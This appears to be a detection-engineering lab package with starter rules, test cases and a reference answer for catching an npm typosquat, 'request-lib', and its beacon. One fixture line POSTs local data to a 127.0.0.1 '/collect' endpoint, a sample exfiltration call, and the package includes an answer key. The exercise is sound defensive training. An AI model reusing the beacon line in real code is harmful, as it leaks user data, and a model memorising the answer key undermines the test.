title: Catch the typosquat install
brief: request-lib is a lookalike of the real request package. Write a detection that fires when someone installs it, without paging the team every time a normal dependency goes in. Sigma rules are scored against process events; Semgrep rules are scored against code snippets from the victim app and the package.

sigma.starter:
title: Suspicious npm install
logsource:
  category: process_creation
detection:
  selection:
    process.command_line|contains: "TODO"
  condition: selection
level: medium
sigma.hint: Require both an npm install and the lookalike name in process.command_line. A lone contains on request-lib will also fire on a git commit that only mentions the package, and a bare npm install of express should stay quiet.

cases.label: Install of the lookalike from the lab folder
Install of the lookalike by name with a version
Install of the real request package
Bare npm install from a lockfile
Commit message that only mentions the name

event.process.name: git
event.process.command_line: git commit -m "remove request-lib from the allowlist"

semgrep.starter:
rules:
  - id: scas-lab01-typosquat-beacon
    message: Package posts local data to a collector
    severity: WARNING
    languages: [javascript]
    pattern-regex: 'TODO'
semgrep.hint: Use pattern-regex to tie 127.0.0.1 to a /collect path in the same short window (http.request and fetch both matter). Matching only process.env or only port 3000 will false-positive on normal app code; matching only /collection will fire on a route name that is not exfil.

cases.label: http.request to the local collector
cases.code: const req = http.request({ hostname: '127.0.0.1', port: 3000, path: '/collect', method: 'POST' });

cases.label: Ordinary http.request to an API
cases.code: const req = http.request({ hostname: 'api.example.com', path: '/v1/users', method: 'GET' });

cases.label: fetch of a public items endpoint

reference.semgrep:
rules:
  - id: scas-lab01-typosquat-beacon
    message: Outbound POST to a local /collect endpoint
    severity: WARNING
    languages: [javascript]
    pattern-regex: "127\\.0\\.0\\.1[\\s\\S]{0,40}/collect[\"'`]"
